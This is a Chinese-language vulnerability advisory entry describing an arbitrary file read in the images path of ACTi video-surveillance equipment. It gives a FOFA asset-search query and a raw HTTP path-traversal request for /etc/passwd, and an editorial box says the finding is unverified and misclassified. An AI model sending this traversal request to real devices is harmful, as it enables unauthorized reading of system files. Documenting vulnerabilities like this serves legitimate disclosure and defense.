---
source: "wy876 漏洞文库"
title: "ACTI-视频监控images存在任意文件读取漏洞"
product: "ACTi视频监控设备/软件，非ActiveMQ"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "具体ACTi型号/版本HTTP路径可达且未规范化，账户/服务文件权限未知"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-272e0cf8b1636ec26574ca58"
entity_id: "ve-272e0cf8b1636ec26574ca58"
schema_version: "1"
---

# ACTI-视频监控images存在任意文件读取漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：具体ACTi型号/版本HTTP路径可达且未规范化，账户/服务文件权限未知
- 证据范围：只给未编码../请求无响应，不能确认有效且客户端可能先规范化路径

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 产品目录严重误分类到Apache ActiveMQ，应视频监控设备
- 版本仅ACTI、无修复/原始依据/返回证据
- 要保留原始路径与请求环境说明，不能靠标题确认漏洞

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

### 一、漏洞描述
ACTI-视频监控images存在任意文件读取漏洞

### 二、影响版本
<font style="color:#000000;">ACTI</font>

### 三、资产测绘
```plain
app="ACTi-视频监控"
```


### 四、漏洞复现
```http
GET /images/../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mh7ce3oc3gcp5th4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
